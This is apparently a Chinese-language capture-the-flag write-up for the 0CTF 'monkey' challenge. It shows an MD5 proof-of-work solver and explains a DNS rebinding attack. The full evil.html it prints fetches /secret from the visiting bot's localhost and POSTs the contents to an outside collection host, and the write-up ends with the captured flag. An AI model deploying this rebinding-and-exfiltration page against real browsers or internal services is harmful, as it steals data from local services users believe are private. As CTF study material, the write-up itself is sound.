# monkey 4pts

上来就是一个PoW(proof of work)，如下解之：
```python
def solve(st):
    i = 0
    while True:
        s = hex(i)
        i += 1
        if hashlib.md5(s).hexdigest()[:6] == st:
            return s
```

由于monkey会在页面停留120s, 那么我们让他访问我们的'http://mydomain:8080/evil.html'后，页面里弄一个setTimeout，90s后ajax get一下'http://127.0.0.1:8080/secret'，在把这flag post到我们的主机上即可。所谓同源策略的话，在一开始把mydomain的A记录指向我们的服务器，ttl设为60s，在monkey访问页面mydomain:8080/evil.html后，马上把A记录改成127.0.0.1，90s后请求mydomain:8080/secret时就是请求127.0.0.1:8080/secret了。

evil.html如下：
```html
<!DOCTYPE html>
<html>
<head>
<script src="/jquery-1.10.2.js"></script>
<script>
function runTest() {
  setTimeout(function() {
        $.get('/secret', function(txt) {        
                $.post('http://somewhereelse/record',{data: txt},function(t){}, 'text');
        }, 'text');
  }, 90000);
}
</script>
</head>
<body onload="runTest()">
</body>
</html>
```

记得receive的时候，在somewhereelse/record发送头：`access-control-allow-origin: *`才能接收到flag`array ('data' => '0ctf{monkey_likes_banananananananaaaa}',)`
